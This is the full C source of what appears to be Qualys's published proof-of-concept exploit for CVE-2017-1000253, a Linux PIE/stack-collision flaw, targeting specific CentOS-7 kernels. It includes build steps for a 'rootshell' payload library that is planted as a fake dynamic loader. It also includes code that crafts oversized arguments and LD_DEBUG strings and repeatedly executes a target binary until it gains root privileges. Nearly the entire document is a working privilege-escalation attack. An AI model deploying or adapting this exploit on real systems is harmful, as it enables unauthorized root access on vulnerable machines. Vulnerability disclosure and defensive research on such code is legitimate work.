/*
 * CVE-2017-1000253.c - an exploit for CentOS-7 kernel versions
 * 3.10.0-514.21.2.el7.x86_64 and 3.10.0-514.26.1.el7.x86_64
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* E-DB Note: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
* E-DB Note: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
* E-DB Note: http://seclists.org/oss-sec/2017/q3/541
*/

/**
cat > rootshell.c << "EOF"
#define _GNU_SOURCE
#include <linux/capability.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#define die() exit(__LINE__)
static void __attribute__ ((constructor)) status(void) {
    if (dup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO) die();
    if (dup2(STDIN_FILENO, STDERR_FILENO) != STDERR_FILENO) die();
    const pid_t pid = getpid();
    if (pid <= 0) die();
    printf("Pid:\t%zu\n", (size_t)pid);
    uid_t ruid, euid, suid;
    gid_t rgid, egid, sgid;
    if (getresuid(&ruid, &euid, &suid)) die();
    if (getresgid(&rgid, &egid, &sgid)) die();
    printf("Uid:\t%zu\t%zu\t%zu\n", (size_t)ruid, (size_t)euid, (size_t)suid);
    printf("Gid:\t%zu\t%zu\t%zu\n", (size_t)rgid, (size_t)egid, (size_t)sgid);
    static struct __user_cap_header_struct header;
    if (capget(&header, NULL)) die();
    if (header.version <= 0) die();
    header.pid = pid;
    static struct __user_cap_data_struct data[2];
    if (capget(&header, data)) die();
    printf("CapInh:\t%08x%08x\n", data[1].inheritable, data[0].inheritable);
    printf("CapPrm:\t%08x%08x\n", data[1].permitted, data[0].permitted);
    printf("CapEff:\t%08x%08x\n", data[1].effective, data[0].effective);
    fflush(stdout);
    for (;;) sleep(10);
    die();
}
EOF
gcc -fpic -shared -nostartfiles -Os -s -o rootshell rootshell.c
xxd -i rootshell > rootshell.h
**/

#define _GNU_SOURCE
#include <elf.h>
#include <fcntl.h>
#include <link.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define mempset(_s, _c, _n) (memset((_s), (_c), (_n)) + (_n))

#define PAGESZ ((size_t)4096)
#define STACK_ALIGN ((size_t)16)
#define SUB_STACK_RAND ((size_t)8192)
#define SAFE_STACK_SIZE ((size_t)24<<10)
#define MAX_ARG_STRLEN ((size_t)128<<10)

#define INIT_STACK_EXP (131072UL)
#define STACK_GUARD_GAP (1UL<<20)
#define MIN_GAP (128*1024*1024UL + (((-1UL) & 0x3fffff) << 12))

#define LDSO "/lib64/ld-linux-x86-64.so.2"
#define LDSO_OFFSET ((size_t)0x238)

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

struct elf_info {
    uintptr_t rx_start, rx_end;
    uintptr_t rw_start, rw_end;
    uintptr_t dynamic_start;
    uintptr_t data_start;
};

static struct elf_info
get_elf_info(const char * const binary)
{
    struct elf_info elf;
    memset(&elf, 0, sizeof(elf));

    const int fd = open(binary, O_RDONLY);
    if (fd <= -1) die();
    struct stat st;
    if (fstat(fd, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= LDSO_OFFSET + sizeof(LDSO)) die();
    if (memcmp(buf + LDSO_OFFSET, LDSO, sizeof(LDSO))) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_type != ET_DYN) die();
    if (ehdr->e_machine != EM_X86_64) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();

    unsigned int i;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type != PT_LOAD) continue;
        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr != phdr->p_paddr) die();
        if (phdr->p_vaddr >= SAFESZ) die();
        if (phdr->p_memsz >= SAFESZ) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_align != 2 * STACK_GUARD_GAP) die();

        const uintptr_t start = phdr->p_vaddr & ~(PAGESZ-1);
        const uintptr_t end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
        if (elf.rw_end) die();

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                if (elf.rx_end) die();
                if (phdr->p_vaddr) die();
                elf.rx_start = start;
                elf.rx_end = end;
                break;
            case PF_R | PF_W:
                if (!elf.rx_end) die();
                if (start <= elf.rx_end) die();
                elf.rw_start = start;
                elf.rw_end = end;
                break;
            default:
                die();
        }
    }
    if (!elf.rx_end) die();
    if (!elf.rw_end) die();

    uintptr_t _dynamic = 0;
    uintptr_t _data = 0;
    uintptr_t _bss = 0;

    for (i = 0; i < ehdr->e_shnum; i++) {
        const ElfW(Shdr) * const shdr = (const ElfW(Shdr) *)(buf + ehdr->e_shoff) + i;
        if (!(shdr->sh_flags & SHF_ALLOC)) continue;
        if (shdr->sh_addr <= 0 || shdr->sh_addr >= SAFESZ) die();
        if (shdr->sh_size <= 0 || shdr->sh_size >= SAFESZ) die();
        #undef SAFESZ
        const uintptr_t start = shdr->sh_addr;
        const uintptr_t end = start + shdr->sh_size;

        if (!(shdr->sh_flags & SHF_WRITE)) {
            if (start < elf.rw_end && end > elf.rw_start) die();
            continue;
        }
        if (start < elf.rw_start || end > elf.rw_end) die();
        if (_bss) die();

        switch (shdr->sh_type) {
            case SHT_PROGBITS:
                if (start <= _data) die();
                _data = start;
                break;
            case SHT_NOBITS:
                if (!_data) die();
                _bss = start;
                break;
            case SHT_DYNAMIC:
                if (shdr->sh_entsize != sizeof(ElfW(Dyn))) die();
                if (_dynamic) die();
                _dynamic = start;
                /* fall through */
            default:
                _data = 0;
                break;
        }
    }
    elf.dynamic_start = _dynamic;
    elf.data_start = _data;
    if (!_dynamic) die();
    if (!_data) die();
    if (!_bss) die();
    free(buf);
    return elf;
}

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();
  {
    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    if (strcmp(platform, "x86_64")) die();
  }
    if (my_argc != 2) {
        printf("Usage: %s binary\n", my_argv[0]);
        die();
    }
    const char * const binary = realpath(my_argv[1], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, R_OK | X_OK)) die();
    const struct elf_info elf = get_elf_info(binary);
    if (elf.rx_start) die();

    if (sizeof(ElfW(Dyn)) != STACK_ALIGN) die();
    if (elf.dynamic_start % STACK_ALIGN != STACK_ALIGN / 2) die();

    const uintptr_t arg_start = elf.rx_end + 2 * STACK_GUARD_GAP + INIT_STACK_EXP + PAGESZ-1;
    if (arg_start >= elf.rw_end) die();

    const size_t argv_size = (arg_start - elf.data_start) - (SAFE_STACK_SIZE + 8*8+22*2*8+16+4*STACK_ALIGN + SUB_STACK_RAND);
    printf("argv_size %zu\n", argv_size);
    if (argv_size >= arg_start) die();

    const size_t arg0_size = elf.rw_end - arg_start;
    if (arg0_size % PAGESZ != 1) die();

    const size_t npads = argv_size / sizeof(char *);
    if (npads <= arg0_size) die();

    const size_t smash_size = (elf.data_start - elf.rw_start) + SAFE_STACK_SIZE + SUB_STACK_RAND;
    if (smash_size >= (elf.rw_start - elf.rx_end) - STACK_GUARD_GAP) die();
    if (smash_size + 1024 >= MAX_ARG_STRLEN) die();
    printf("smash_size %zu\n", smash_size);

    const size_t hi_smash_size = (SAFE_STACK_SIZE * 3 / 4) & ~(STACK_ALIGN-1);
    printf("hi_smash_size %zu\n", hi_smash_size);
    if (hi_smash_size <= STACK_ALIGN) die();
    if (hi_smash_size >= smash_size) die();

    const size_t lo_smash_size = (smash_size - hi_smash_size) & ~(STACK_ALIGN-1);
    printf("lo_smash_size %zu\n", lo_smash_size);
    if (lo_smash_size <= STACK_ALIGN) die();

    #define LD_DEBUG_ "LD_DEBUG="
    static char foreground[MAX_ARG_STRLEN];
  {
    char * cp = stpcpy(foreground, LD_DEBUG_);
    cp = mempset(cp, 'A', hi_smash_size - 16);
    cp = mempset(cp, ' ', 1);
    cp = mempset(cp, 'A', 24);
    cp = mempset(cp, ' ', 1);
    cp = mempset(cp, 'A', 1);
    cp = mempset(cp, ' ', DT_SYMTAB + 16 - (24+1 + 1 + DT_NEEDED) % 16);
    cp = mempset(cp, 'A', 80);
    cp = mempset(cp, ' ', 16);
    cp = mempset(cp, 'A', 31);
    cp = mempset(cp, ' ', 1);
    cp = mempset(cp, 'A', 1);
    cp = mempset(cp, ' ', DT_NEEDED + 16 - (31+1 + 1 + DT_STRTAB) % 16);
    cp = mempset(cp, 'A', 80);
    cp = mempset(cp, ' ', 16);
    cp = mempset(cp, 'A', 31);
    cp = mempset(cp, ' ', 1);
    cp = mempset(cp, 'A', 1);
    cp = mempset(cp, ' ', DT_STRTAB + 16 - (31+1 + 1 + 1 + strlen(binary)+1 + sizeof(void *)) % 16);
    cp = mempset(cp, 'A', lo_smash_size - 16);
    if (cp >= foreground + sizeof(foreground)) die();
    if (cp <= foreground) die();
    if (*cp) die();
    if (strlen(foreground) != (size_t)(cp - foreground)) die();
  }
    static char background[MAX_ARG_STRLEN];
  {
    char * cp = stpcpy(background, LD_DEBUG_);
    cp = mempset(cp, 'L', lo_smash_size);
    size_t i;
    for (i = 0; i < (32 + 48 + 96) / sizeof(uint64_t); i++) {
        const uint64_t strtab = 0x8888888888888888UL + 0;
        cp = mempcpy(cp, &strtab, sizeof(uint64_t));
    }
    for (i = 0; i < (32 + 48 + 96) / sizeof(uint64_t); i++) {
        const uint64_t needed = 0x7777777777777778UL + LDSO_OFFSET+1;
        cp = mempcpy(cp, &needed, sizeof(uint64_t));
    }
    cp = mempset(cp, 'H', 32 + 48 + hi_smash_size - 16);
    if (cp >= background + sizeof(background)) die();
    if (cp <= background) die();
    if (*cp) die();
    if (strlen(background) != (size_t)(cp - background)) die();
    if (strlen(background) != strcspn(background, " ,:")) die();
  }

    static char pad[MAX_ARG_STRLEN];
    memset(pad, ' ', sizeof(pad)-1);
    if (pad[sizeof(pad)-1]) die();
    if (strlen(pad) != sizeof(pad)-1) die();
    if (sizeof(pad) % STACK_ALIGN) die();
  {
    double probability = npads * sizeof(pad) - (128<<20);
    probability *= probability / 2;
    probability /= (16UL<<30);
    probability /= ( 1UL<<40);
    printf("probability 1/%zu\n", (size_t)(1 / probability));
  }

    static char arg0[MAX_ARG_STRLEN];
    if (arg0_size >= sizeof(arg0)) die();
    if (arg0_size <= 0) die();
    memset(arg0, ' ', arg0_size-1);
    static char arg2[MAX_ARG_STRLEN];

    const size_t nargs = 3 + npads - (arg0_size-1);
    char ** const argv = calloc(nargs + 1, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = arg0;
    *ap++ = "--help";
    *ap++ = arg2;
    size_t n;
    for (n = ap - argv; n < nargs; n++) {
        *ap++ = pad;
    }
    if (ap != argv + nargs) die();
    if (*ap) die();
  }

    const size_t nenvs = 2 + arg0_size-1;
    char ** const envp = calloc(nenvs + 1, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = background;
    *ep++ = foreground;
    size_t n;
    for (n = ep - envp; n < nenvs; n++) {
        *ep++ = pad;
    }
    if (ep != envp + nenvs) die();
    if (*ep) die();
  }

  {
    size_t len = strlen(binary)+1 + sizeof(void *);
    char * const * const __strpp[] = { argv, envp, NULL };
    char * const * const * strpp;
    for (strpp = __strpp; *strpp; strpp++) {
        char * const * strp;
        for (strp = *strpp; *strp; strp++) {
            len += strlen(*strp) + 1;
        }
    }
    len = 1 + PAGESZ - len % PAGESZ;
    memset(arg2, ' ', len);
  }

  {
    if (npads * sizeof(pad) + (1<<20) >= MIN_GAP / 4) die();
    const struct rlimit rlimit_stack = { MIN_GAP, MIN_GAP };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }
    const int dev_null = open("/dev/null", O_WRONLY);
    if (dev_null <= -1) die();

  {
    static char ldso[] = "." LDSO;
    char * const slash = strrchr(ldso, '/');
    if (!slash) die();
    *slash = '\0';
    mkdir(ldso, 0755);
    *slash = '/';

    const int fd = open(ldso, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0755);
    if (fd <= -1) die();
    static const
    #include "rootshell.h"
    if (write(fd, rootshell, rootshell_len) != (ssize_t)rootshell_len) die();
    if (close(fd)) die();
  }

    size_t try;
    for (try = 1; try; try++) {
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(dev_null, STDOUT_FILENO) != STDOUT_FILENO) die();
            if (dup2(dev_null, STDERR_FILENO) != STDERR_FILENO) die();
            if (dev_null > STDERR_FILENO) if (close(dev_null)) die();
            execve(binary, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGKILL:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}